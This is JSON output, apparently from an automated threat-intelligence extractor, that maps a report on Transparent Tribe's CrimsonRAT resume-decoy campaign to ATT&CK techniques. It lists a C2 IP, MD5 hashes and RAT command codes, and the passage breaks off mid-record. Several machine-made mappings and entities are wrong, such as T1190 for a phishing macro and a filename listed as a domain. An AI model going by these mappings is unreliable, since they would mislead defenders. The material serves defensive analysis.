{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 18,
      "langchain_extractions": 1,
      "high_confidence_ttps": 0,
      "processing_time_ms": 12448.675
    },
    "extraction_results": [
      {
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "extracted_ttps": [
          {
            "ttp_id": "f5b04a8e-70a0-4d1a-b58b-14051769e985",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1204 - User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attacker uses a malicious document with macro code to execute the malware. The macro code is disguised as an Mdiaz-related program and runs automatically when the user opens the document.",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.548,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Sonam kaur_2",
              "Sonam Singh's document",
              "macro code"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ef454ec8-2fcf-4529-80b8-518cc119843d",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1059 - Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The attacker uses a .Net Dropper program to execute the malware. The program determines whether a zip file exists, reads the resource section, and writes the data to the file if it does not exist.",
            "confidence_score": 0.715,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.58,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".Net Dropper",
              "zip file"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fef36b5b-e854-4c27-b934-ac18d50d39b1",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1082 - System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The attacker uses the CrimsonRAT malware to gather system information, including process enumeration, file properties, and disk information.",
            "confidence_score": 0.708,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.452,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "process enumeration",
              "file properties",
              "disk information"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ba83a58a-54f6-4089-96b6-740981577a11",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1190 - Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The attacker uses a malicious document with macro code to exploit a public-facing application and gain initial access to the system.",
            "confidence_score": 0.698,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.468,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious document",
              "macro code"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f5dfc42b-d3b3-4e7f-aab2-415d2977262f",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1566 - Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The attacker uses a malicious document with macro code to phish the user and gain initial access to the system.",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious document",
              "macro code"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "33bdbcb4-8bab-4f71-a961-e21be9b7df72",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1005 - Data from Local System",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "The attacker uses the CrimsonRAT malware to collect data from the local system, including files and screenshots.",
            "confidence_score": 0.693,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "file collection",
              "screenshot"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8b74459a-b9d2-4a02-90e9-ca90f215b563",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1218 - Signed Binary Proxy Execution",
            "attack_id": "T1218",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the CrimsonRAT malware to execute a signed binary proxy, disguising itself as the FireFox browser.",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "FireFox browser"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2d595ff0-9f48-42d5-8852-6398c5926a1e",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1620 - Reflective Code Loading",
            "attack_id": "T1620",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the .Net Dropper program to load the CrimsonRAT malware reflectively, avoiding detection by security software.",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".Net Dropper",
              "CrimsonRAT"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5fbd09ca-b56f-410f-8894-96131f269596",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1105 - Ingress Tool Transfer",
            "attack_id": "T1105",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the .Net Dropper program to transfer the CrimsonRAT malware to the compromised system.",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".Net Dropper",
              "CrimsonRAT"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "07ef4e38-2454-462d-8208-18f9f31028a3",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The attacker uses the CrimsonRAT malware to exfiltrate data over the command and control channel.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "command and control channel"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "58139738-0280-4f72-94f5-628e4751a61e",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1021 - Remote Services",
            "attack_id": "T1021",
            "tactic": "Lateral Movement",
            "description": "The attacker uses the CrimsonRAT malware to establish a remote connection to the compromised system.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "remote connection"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fbb5b46e-9b2b-48fe-91dd-f66d2d01592c",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1497 - Virtualization/Sandbox Evasion",
            "attack_id": "T1497",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the CrimsonRAT malware to evade virtualization and sandbox detection.",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5183dbf1-d30b-4b95-897b-f31fe9f647d7",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a58fe6f7-1eeb-4091-8640-68c488a055b4",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "d8b1fe89-39a8-4b32-80d6-df3ee81362d5",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Account Discovery",
            "attack_id": "T1087",
            "tactic": "Discovery",
            "description": "Detected Account Discovery activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "3f9e9579-765a-470c-b42e-5b97deb2b068",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "46153124-d82c-44a4-a4ea-ecbe8ea0b83e",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "f147e587-2728-44cd-b6f2-296dfabe1694",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "1 / 1 4 Analysis of APT-C-56 (Transparent Tribe) camouflage resume attack campaign mp.weixin.qq.com/s/xU7b3m-L2OlAi2bU7nBj0A Included in the collection  APT 87 piece   \u5357\u4e9a\u5730\u533a 26 piece  APT-C-56 Transparent Tribe 7 piece APT-C-56 Transparent Tribe APT-C-56 (Transparent Tribe)  also known as Transparent Tribe  APT36  ProjectM  C-Major  is an APT organization with a South Asian background  which has long targeted attacks on the politics and military of neighboring countries and regions (especially India)  and has developed its own exclusive Trojan horse CrimsonRAT  and has also been found to widely spread USB worms. It has been targeting India s government  public sector  and various industries including but not limited to healthcare  power  finance  manufacturing  etc. to maintain a high level of information theft activities. Earlier this year  Transparent Tribe and SideCopy were found to be using the same infrastructure and using the same themes to target similar targets  using smuggling intelligence-related decoys to camouflage Indian Defense Ministry emails to launch frequent attacks against India. We also found an attack campaign targeting the foreign trade industry using backlinks. Recently  the 360 Advanced Threat Institute detected a sample of suspected Transparent Tribe s attack activity. We speculate that the previous operation went undetected  and the sample used the bait documentation to eventually release its exclusive Trojan  CrimsonRAT. 1. Analysis of attack activities 1. Attack process analysis Attack campaigns using decoy documents that disguise resumes. Through the release of CrimsonRAT through Dropper  continuous monitoring of users in the middle of the recruitment. 2. Load delivery analysis 2 / 1 4 2.1 Disguising Documents The sample name we captured is Sonam kaur_2  the document name is similar to the sample  the file name below is Sonam Singh s document  which also uses the name of the person as the document name  and Sonam Singh s document is a personal work resume. Unlike the same attack we speculate is that the malicious document we capture only contains macro code inside the open window  and once the user inadvertently clicks to start the macro function  the hidden malicious macro code runs automatically. We also found an account with the same name on Twitter  and in the profile we can see that the status location is in Mumbai and is a wealth consulting firm. The Tweet update is as of July 2021  and while this is consistent with our presumed timing of the action  it is not possible to tell if this tweet is related to the documentation. 3 / 1 4 The macro code disguises itself as an Mdiaz-related program in the ALLUSERSPROFILE directory  reads hidden data from the specified structure of the malicious document and writes it to a file  which shows that APT-C-56 (transparent tribe) uses simple string concatenation technology to disassemble exe characters to avoid static killing by antivirus engines. 4 / 1 4 Launch the malicious PE program that is released  while further reading the normal text document data hidden inside  release it to the worddcs.docx  and finally open this document to disguise and confuse the user. 5 / 1 4 2.2 Dropper The released PE file is a .Net Dropper program. First  determine whether a zip file exists  read the resource section and write the data to the file if it does not exist  delete it and write it again. 6 / 1 4 Determine whether there is a file with the suffix .ford in the directory  and if so  create a startup file directly. If no suffix is specified  the file goes directly to the subsequent release process. 7 / 1 4 Then determine whether there is a backdoor RAT stored in the resource  and if not  download and run it from the C C through the network connection. 3. Attack component analysis The RAT backdoor released after download disguises itself as the FireFox browser and is the CrimsonRAT that the Transparent Tribe has been maintaining and using. 8 / 1 4 The control codes and commands are as follows: directives Control code Enumerate processesgey7tavs 9 / 1 4 Upload a GIF thy7umb Enumerate processespry7ocl Set up auto-start puy7tsrt Download the file doy7wf Set up screenshots scy7rsz Gets the file propertiesfiy7lsz See screenshots cdy7crgn csy7crgn csy7dcrgn Stop taking screenshotssty7ops Desktop screenshotscyr7en Gets disk informationdiy7rs Parameter initializationcny7ls Delete the file dey7lt Get file information afy7ile Delete a user udy7lt Search for files liy7stf Get user informationiny7fo 1 0 / 1 4 Execute the file ruy7nf Move files fiy7le 2. Attribution research and judgment Based on the similarity of the macro code and CrimsonRAT judging that this is an APT-C-5 6 (Transparent Tribe) attack activity  the sample found this time has many similarities to our previous APT-C-56 (Transparent Tribe) attack analysis report. 1. Analysis related to previous attacks 1.1 Macro code is similar The following figure shows the analysis from the previous disclosure action: The following figure shows the analysis of this attack: 1 1 / 1 4 1.2 Dropper is similar The following figure shows the analysis from the previous disclosure action: 1 2 / 1 4 The following figure shows the analysis of this attack: 2. Difference analysis from previous actions The last campaign released RATs directly from resources. 1 3 / 1 4 The samples found this time were downloaded via a network connection for subsequent RATs. summary The India-Pakistan conflict has always existed because of border  cultural  ethnic  historical and other reasons  and the military and political espionage caused by geopolitical conflicts has always been the main theme of the region. Pakistan s sidecopy group has been imitating 1 4 / 1 4 the Sidewinder attack  and the Indian group will also imitate the transparent tribe s attack. Chaotic situations often represent a contest of economic  military  and cybersecurity capabilities between countries  and it is increasingly important to seize intelligence opportunities through cyberattacks and maintain national security. Appendix IOC fdb9fe902ef9e9cb893c688c737e4cc7 ccc33eff063e44fad0fc3e6057b1bcd9 0f9f34e3e872e57446ffdcfa90a7b954 35e481dec398f206d0be12bc98ccc17a 33ea133da15dc060b7709558c97209d2 860da5abde63a42b3fbd8202d0cff6d2 8e642dd589e53347555a7b2596512ed7 23.254.119.234   6178 360 Advanced Threat Institute 360 Advanced Threat Institute is the core capability support department of 360 Digital Security Group  composed of 360 senior security experts  focusing on the discovery  defense  disposal and research of advanced threats  and has taken the lead in capturing many well- known 0-day attacks in the world  such as double killing  double star  nightmare formula  etc.  exclusively disclosing the advanced actions of many national APT organizations  winning wide recognition inside and outside the industry  and providing strong support for 360 to ensure national network security.",
            "commands": [],
            "file_paths": [
              "/"
            ],
            "registry_keys": []
          },
          "entities": {
            "malware": [
              "APT",
              "Dropper",
              "RAT",
              "Trojan",
              "backdoor",
              "conti"
            ],
            "tools": [
              "Net",
              "at",
              "reg",
              "sc"
            ],
            "threat_actors": [
              "APT36"
            ],
            "ips": [
              "23.254.119.234"
            ],
            "domains": [
              "mp.weixin.qq.com",
              "worddcs.docx"
            ],
            "hashes": {
              "md5": [
                "0f9f34e3e872e57446ffdcfa90a7b954",
                "33ea133da15dc060b7709558c97209d2",
                "35e481dec398f206d0be12bc98ccc17a",
                "860da5abde63a42b3fbd8202d0cff6d2",
                "8e642dd589e53347555a7b2596512ed7"
              ]
            }
          },
          "ttp_indicators": {
            "initial_access": [
              "Phishing"
            ],
            "execution": [
              "User Execution: Malicious File"
            ],
            "discovery": [
              "Account Discovery"
            ],
            "collection": [
              "Archive Collected Data",
              "Screen Capture"
            ],
            "exfiltration": [
              "Exfiltration Over C2 Channel"
            ]
          },
          "context": "\n**File System Activity:**\n- /\n\n**Network Indicators:**\n- 23.254.119.234\n- worddcs.docx\n- mp.weixin.qq.com\n\n**Key Security Terms:** process, dropper, create, backdoor, delete, execute, upload, macro, trojan, download"
        },
        "metadata": {
          "extraction_method": "LangChain-Enhanced",
          "nlp_processing_time_ms": 8.954,
          "llm_processing_time_ms": 1132.263
        }
      }
    ],
    "results": [
      {
        "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
        "extracted_ttps": [
          {
            "ttp_id": "f5b04a8e-70a0-4d1a-b58b-14051769e985",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1204 - User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attacker uses a malicious document with macro code to execute the malware. The macro code is disguised as an Mdiaz-related program and runs automatically when the user opens the document.",
            "confidence_score": 0.716,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.548,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Sonam kaur_2",
              "Sonam Singh's document",
              "macro code"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ef454ec8-2fcf-4529-80b8-518cc119843d",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1059 - Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The attacker uses a .Net Dropper program to execute the malware. The program determines whether a zip file exists, reads the resource section, and writes the data to the file if it does not exist.",
            "confidence_score": 0.715,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.58,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".Net Dropper",
              "zip file"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "fef36b5b-e854-4c27-b934-ac18d50d39b1",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1082 - System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The attacker uses the CrimsonRAT malware to gather system information, including process enumeration, file properties, and disk information.",
            "confidence_score": 0.708,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.452,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "process enumeration",
              "file properties",
              "disk information"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ba83a58a-54f6-4089-96b6-740981577a11",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1190 - Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The attacker uses a malicious document with macro code to exploit a public-facing application and gain initial access to the system.",
            "confidence_score": 0.698,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.468,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious document",
              "macro code"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f5dfc42b-d3b3-4e7f-aab2-415d2977262f",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1566 - Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The attacker uses a malicious document with macro code to phish the user and gain initial access to the system.",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "malicious document",
              "macro code"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "33bdbcb4-8bab-4f71-a961-e21be9b7df72",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1005 - Data from Local System",
            "attack_id": "T1005",
            "tactic": "Collection",
            "description": "The attacker uses the CrimsonRAT malware to collect data from the local system, including files and screenshots.",
            "confidence_score": 0.693,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "file collection",
              "screenshot"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8b74459a-b9d2-4a02-90e9-ca90f215b563",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1218 - Signed Binary Proxy Execution",
            "attack_id": "T1218",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the CrimsonRAT malware to execute a signed binary proxy, disguising itself as the FireFox browser.",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "CrimsonRAT",
              "FireFox browser"
            ],
            "tools": [
              "reg",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2d595ff0-9f48-42d5-8852-6398c5926a1e",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1620 - Reflective Code Loading",
            "attack_id": "T1620",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the .Net Dropper program to load the CrimsonRAT malware reflectively, avoiding detection by security software.",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".Net Dropper",
              "CrimsonRAT"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5fbd09ca-b56f-410f-8894-96131f269596",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1105 - Ingress Tool Transfer",
            "attack_id": "T1105",
            "tactic": "Defense Evasion",
            "description": "The attacker uses the .Net Dropper program to transfer the CrimsonRAT malware to the compromised system.",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              ".Net Dropper",
              "CrimsonRAT"
            ],
            "tools": [
              "reg",
              "Dropper",
              "CrimsonRAT",
              "sc",
              "at",
              "zip",
              "Net",
              "apt"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "07ef4e38-2454-462d-8208-18f9f31028a3",
            "report_id": "pdf-b0f6facbc611270bada1a0b9dc9f3f75",
            "technique_name": "T1041 - Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The attacker uses the CrimsonRAT malware to exfiltrate data over the command and control channel.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
